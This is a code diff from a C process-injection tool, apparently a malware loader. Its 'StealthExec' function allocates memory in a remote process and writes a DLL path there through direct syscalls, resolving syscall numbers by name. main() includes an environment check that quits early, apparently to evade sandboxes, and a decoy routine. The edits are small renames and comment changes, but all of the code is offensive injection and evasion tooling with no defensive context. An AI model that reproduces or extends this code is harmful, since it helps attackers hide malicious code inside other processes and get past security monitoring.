@@ -7,10 +7,9 @@
 
 
 // Core Injection Logic
-void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
+void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllN) {
     PVOID memLoc = NULL;
-    SIZE_T sz = strlen(dllEnc) + 1;
-    //SIZE_T sz = 0x10000;
+    SIZE_T sz = strlen(dllN) + 1;
     HANDLE hThreadRemote;
     NTSTATUS status;
 
@@ -28,9 +27,6 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
         // printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
         return;
     }
-    // } else {
-    //     printf("[+] Memory allocated at: %p\n", memLoc);
-    // }
 
     if (memLoc == NULL) {
         // printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
@@ -38,8 +34,8 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     }
 
     SetSyid(GetSyid("NtWriteVirtualMemory"));
-    // Write Encrypted DLL Path to Remote Process
-    status = CustWVM(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
+    // Write DLL Path to Remote Process
+    status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
     if (status != 0) {
         // printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
@@ -63,7 +59,7 @@ int main(int argc, char* argv[]) {
     if (PerfomChecksEnv()) {
         return 0;
     }
-    
+
     //If no DLL given, abort.
     if (argc != 2) {
         SortNumbers();
